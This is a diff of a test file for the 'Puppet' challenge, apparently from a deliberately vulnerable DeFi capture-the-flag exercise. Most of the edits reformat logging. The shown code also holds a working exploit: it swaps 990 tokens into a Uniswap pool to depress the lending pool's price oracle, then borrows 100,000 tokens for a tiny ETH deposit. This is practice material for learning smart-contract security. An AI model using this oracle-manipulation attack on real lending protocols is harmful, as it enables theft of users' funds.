@@ -111,23 +111,23 @@ describe('[Challenge] Puppet', function () {
             console.log("\n" + status + "\n");
             console.log("[+] Oracle Calc Deposit Required")
             let _oracle = (await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther("1")))
-            console.log(fromWei(_oracle._hex))
+            console.log("=> Oracle: " + fromWei(_oracle._hex) + "\n")
             console.log("[+] Attacker ETH-DVT Pair Balance")
             let attacker_eth = await ethers.provider.getBalance(attacker.address);
             let attacker_dtv = await this.token.balanceOf(attacker.address);
-            console.log(fromWei(attacker_eth._hex));    // attacker ETH
-            console.log(fromWei(attacker_dtv._hex));  // attacker DVT
+            console.log("=> Attacker ETH : " + fromWei(attacker_eth._hex) + "\n");    // attacker ETH
+            console.log("=> Attacker DVT : " + fromWei(attacker_dtv._hex) + "\n");  // attacker DVT
             console.log("[+] LendingPool ETH-DVT Pair Balance");
             let pool_eth = await ethers.provider.getBalance(this.lendingPool.address);
             let pool_dtv = await this.token.balanceOf(this.lendingPool.address);
-            console.log(fromWei(pool_eth._hex));    // lendingPool ETH
-            console.log(fromWei(pool_dtv._hex));  // lendingPool DVT
+            console.log("Lending Pool ETH : " + fromWei(pool_eth._hex) + "\n");    // lendingPool ETH
+            console.log("Lending Pool DVT : " + fromWei(pool_dtv._hex) + "\n");  // lendingPool DVT
             console.log("[+] Uniswap Exchange ETH-DVT Pair Balance");
             let exchange_eth = await ethers.provider.getBalance(this.uniswapExchange.address);
             let exchange_dtv = await this.token.balanceOf(this.uniswapExchange.address);
 
-            console.log(fromWei(exchange_eth._hex));    // exchange ETH
-            console.log(fromWei(exchange_dtv._hex));  // exchange DVT
+            console.log("Uniswap Exchange ETH : " + fromWei(exchange_eth._hex) + "\n");    // exchange ETH
+            console.log("Uniswap Exchange DVT : " + fromWei(exchange_dtv._hex) + "\n");  // exchange DVT
         }
         /** CODE YOUR EXPLOIT HERE */
         _curInfo("Initial");
@@ -138,15 +138,20 @@ describe('[Challenge] Puppet', function () {
             ethers.utils.parseEther("990")
         );
 
+
+
         await this.uniswapExchange.connect(attacker).tokenToEthTransferInput(
             ethers.utils.parseEther("990"), // tokens_sold
             ethers.utils.parseEther("1"),   // min_eth
             (await ethers.provider.getBlock('latest')).timestamp * 2, attacker.address  // deadline
         );
 
+        _curInfo("Middler");
+
         let _oraclePrice = ethers.BigNumber.from(
             await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther("1"))
         );
+        console.log("Oracle Price: " + fromWei(_oraclePrice._hex) + "\n");
         let muOraclePrice = _oraclePrice.mul(100000).add(1);
 
         await this.lendingPool.connect(attacker).borrow(ethers.utils.parseEther("100000"), { value: muOraclePrice });
